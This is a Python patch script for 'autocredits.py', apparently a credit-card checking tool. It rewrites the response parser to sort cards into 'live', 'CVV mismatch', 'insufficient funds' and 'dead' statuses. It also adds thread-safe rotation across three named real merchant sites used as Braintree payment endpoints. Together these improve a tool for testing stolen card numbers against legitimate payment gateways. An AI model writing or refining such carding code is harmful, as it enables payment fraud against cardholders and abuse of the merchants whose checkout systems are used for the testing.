import re

c = open('autocredits.py').read()

old = '''                response_text = response.text.lower()

                if any(k in response_text for k in live_keywords):
                    return {'status': 'live', 'message': 'Payment successful', 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
                elif any(k in response_text for k in funds_keywords):
                    return {'status': 'insufficient', 'message': 'Insufficient Funds', 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
                elif any(k in response_text for k in ccn_keywords):
                    return {'status': 'live_cvv', 'message': 'CVV Mismatch', 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
                elif any(k in response_text for k in dead_keywords):
                    return {'status': 'dead', 'message': 'Card Declined', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}

                return {
                    'status': 'dead',
                    'message': 'Card Declined',
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }'''

new = '''                raw = response.text.strip()
                parts = re.split(r'<br\\s*/?>', raw, flags=re.IGNORECASE)
                parts = [re.sub(r'<[^>]+>', '', p).strip() for p in parts]
                parts = [p for p in parts if p and not p.startswith('#')]
                reason = parts[0] if parts else 'Unknown'
                rt = raw.upper().strip()
                if rt.startswith('#LIVE'):
                    return {'status': 'live', 'message': reason[:80], 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
                elif rt.startswith('#CCN'):
                    return {'status': 'live_cvv', 'message': reason[:80], 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
                elif rt.startswith('#FUNDS') or rt.startswith('#INSUF'):
                    return {'status': 'insufficient', 'message': reason[:80], 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
                elif rt.startswith('#DEAD') or rt.startswith('#ERROR'):
                    return {'status': 'dead', 'message': reason[:80], 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}
                rl = raw.lower()
                if any(k in rl for k in ['approved', 'success', 'authorized']):
                    return {'status': 'live', 'message': reason[:80], 'icon': '✅', 'card_info': card_info, 'time': elapsed_time}
                elif any(k in rl for k in ['cvv', 'cvc', 'security code']):
                    return {'status': 'live_cvv', 'message': reason[:80], 'icon': '⚠️', 'card_info': card_info, 'time': elapsed_time}
                elif any(k in rl for k in ['insufficient', 'funds']):
                    return {'status': 'insufficient', 'message': reason[:80], 'icon': '💰', 'card_info': card_info, 'time': elapsed_time}
                return {'status': 'dead', 'message': reason[:80] if reason else 'Declined', 'icon': '❌', 'card_info': card_info, 'time': elapsed_time}'''

# Also fix site rotation
old_site = 'DEFAULT_BRAINTREE_SITE = "https://store.segway.com,https://www.asedeals.com,https://www.broderbund.com"'
new_site = '''DEFAULT_BRAINTREE_SITES = ["https://store.segway.com", "https://www.asedeals.com", "https://www.broderbund.com"]
DEFAULT_BRAINTREE_SITE = DEFAULT_BRAINTREE_SITES[0]
_site_index = 0
import threading as _th; _site_lock = _th.Lock()
def get_next_site():
    global _site_index
    with _site_lock:
        s = DEFAULT_BRAINTREE_SITES[_site_index % len(DEFAULT_BRAINTREE_SITES)]
        _site_index += 1
        return s'''

old_get_site = '    return DEFAULT_BRAINTREE_SITE'
new_get_site = '    return get_next_site()'

if old in c:
    c = c.replace(old, new)
    print('✅ Parser fixed')
else:
    print('⚠️ Parser already patched or not found')

if old_site in c:
    c = c.replace(old_site, new_site)
    c = c.replace(old_get_site, new_get_site)
    print('✅ Site rotation fixed')
else:
    print('⚠️ Site already patched or not found')

open('autocredits.py', 'w').write(c)
print('✅ Done - run: python3 -m py_compile autocredits.py')
